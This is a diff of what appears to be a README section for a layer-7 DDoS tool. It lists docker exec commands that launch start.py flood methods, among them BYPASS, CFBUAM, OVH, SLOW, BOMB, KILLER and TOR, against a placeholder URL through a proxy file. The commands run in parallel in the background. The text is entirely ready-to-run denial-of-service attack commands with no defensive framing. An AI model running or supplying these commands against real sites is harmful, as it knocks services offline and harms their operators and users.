@@ -51,56 +51,60 @@
 
 
 ### ddos-layer7代理
-	docker exec -it ddos-layer7 python3 start.py COOKIE url 0 1 null_proxy.txt 200 60 &
- 
-	docker exec -it ddos-layer7 python3 start.py BYPASS url 0 1 null_proxy.txt 200 60 &
- 
-	docker exec -it ddos-layer7 python3 start.py OVH url 0 1 null_proxy.txt 200 60 &
- 
-	docker exec -it ddos-layer7 python3 start.py DGB url 0 1 null_proxy.txt 200 60 &
- 
-	docker exec -it ddos-layer7 python3 start.py STRESS url 0 1 null_proxy.txt 200 60 &
- 
-	docker exec -it ddos-layer7 python3 start.py DOWNLOADER url 0 1 null_proxy.txt 200 60 &
- 
-	docker exec -it ddos-layer7 python3 start.py BOMB url 5 1 null_proxy.txt 200 60 &
- 
-	docker exec -it ddos-layer7 python3 start.py NULL url 0 1 null_proxy.txt 200 60 &
- 
-	docker exec -it ddos-layer7 python3 start.py AVB url 0 1 null_proxy.txt 200 60 &
- 
+
 	docker exec -it ddos-layer7 python3 start.py GET url 0 1 null_proxy.txt 200 60 &
  
-	docker exec -it ddos-layer7 python3 start.py CFB url 0 1 null_proxy.txt 200 60 &
+	docker exec -it ddos-layer7 python3 start.py POST url 0 1 null_proxy.txt 200 60 &
  
-	docker exec -it ddos-layer7 python3 start.py EVEN url 0 1 null_proxy.txt 200 60 &
- 
-	docker exec -it ddos-layer7 python3 start.py DYN url 0 1 null_proxy.txt 200 60 &
- 
-	docker exec -it ddos-layer7 python3 start.py GSB url 0 1 null_proxy.txt 200 60 &
- 
-	docker exec -it ddos-layer7 python3 start.py XMLRPC url 0 1 null_proxy.txt 200 60 &
- 
-	docker exec -it ddos-layer7 python3 start.py SLOW url 0 1 null_proxy.txt 200 60 &
- 
-	docker exec -it ddos-layer7 python3 start.py BOT url 0 1 null_proxy.txt 200 60 &
- 
-	docker exec -it ddos-layer7 python3 start.py PPS url 0 1 null_proxy.txt 200 60 &
- 
-	docker exec -it ddos-layer7 python3 start.py CFBUAM url 0 1 null_proxy.txt 200 60 &
- 
-	docker exec -it ddos-layer7 python3 start.py APACHE url 0 1 null_proxy.txt 200 60 &
- 
-	docker exec -it ddos-layer7 python3 start.py KILLER url 0 1 null_proxy.txt 200 60 &
+	docker exec -it ddos-layer7 python3 start.py OVH url 0 1 null_proxy.txt 200 60 &
  
 	docker exec -it ddos-layer7 python3 start.py RHEX url 0 1 null_proxy.txt 200 60 &
  
 	docker exec -it ddos-layer7 python3 start.py STOMP url 0 1 null_proxy.txt 200 60 &
-
-
-
-
-
+ 
+	docker exec -it ddos-layer7 python3 start.py STRESS url 0 1 null_proxy.txt 200 60 &
+ 
+	docker exec -it ddos-layer7 python3 start.py DYN url 0 1 null_proxy.txt 200 60 &
+ 
+	docker exec -it ddos-layer7 python3 start.py DOWNLOADER url 0 1 null_proxy.txt 200 60 &
+ 
+	docker exec -it ddos-layer7 python3 start.py SLOW url 0 1 null_proxy.txt 200 60 &
+ 
+	docker exec -it ddos-layer7 python3 start.py HEAD url 0 1 null_proxy.txt 200 60 &
+ 
+	docker exec -it ddos-layer7 python3 start.py NULL url 0 1 null_proxy.txt 200 60 &
+ 
+	docker exec -it ddos-layer7 python3 start.py COOKIE url 0 1 null_proxy.txt 200 60 &
+ 
+	docker exec -it ddos-layer7 python3 start.py PPS url 0 1 null_proxy.txt 200 60 &
+ 
+	docker exec -it ddos-layer7 python3 start.py EVEN url 0 1 null_proxy.txt 200 60 &
+ 
+	docker exec -it ddos-layer7 python3 start.py GSB url 0 1 null_proxy.txt 200 60 &
+ 
+	docker exec -it ddos-layer7 python3 start.py DGB url 0 1 null_proxy.txt 200 60 &
+ 
+	docker exec -it ddos-layer7 python3 start.py AVB url 0 1 null_proxy.txt 200 60 &
+ 
+	docker exec -it ddos-layer7 python3 start.py BOT url 0 1 null_proxy.txt 200 60 &
+ 
+	docker exec -it ddos-layer7 python3 start.py APACHE url 0 1 null_proxy.txt 200 60 &
+ 
+	docker exec -it ddos-layer7 python3 start.py XMLRPC url 0 1 null_proxy.txt 200 60 &
+ 
+	docker exec -it ddos-layer7 python3 start.py CFB url 0 1 null_proxy.txt 200 60 &
+ 
+	docker exec -it ddos-layer7 python3 start.py CFBUAM url 0 1 null_proxy.txt 200 60 &
+ 
+	docker exec -it ddos-layer7 python3 start.py BYPASS url 0 1 null_proxy.txt 200 60 &
+ 
+	docker exec -it ddos-layer7 python3 start.py BOMB url 5 1 null_proxy.txt 200 60 &
+ 
+	docker exec -it ddos-layer7 python3 start.py KILLER url 0 1 null_proxy.txt 200 60 &
+ 
+	docker exec -it ddos-layer7 python3 start.py TOR url 0 1 null_proxy.txt 200 60 &
+ 
+	
 
 
 
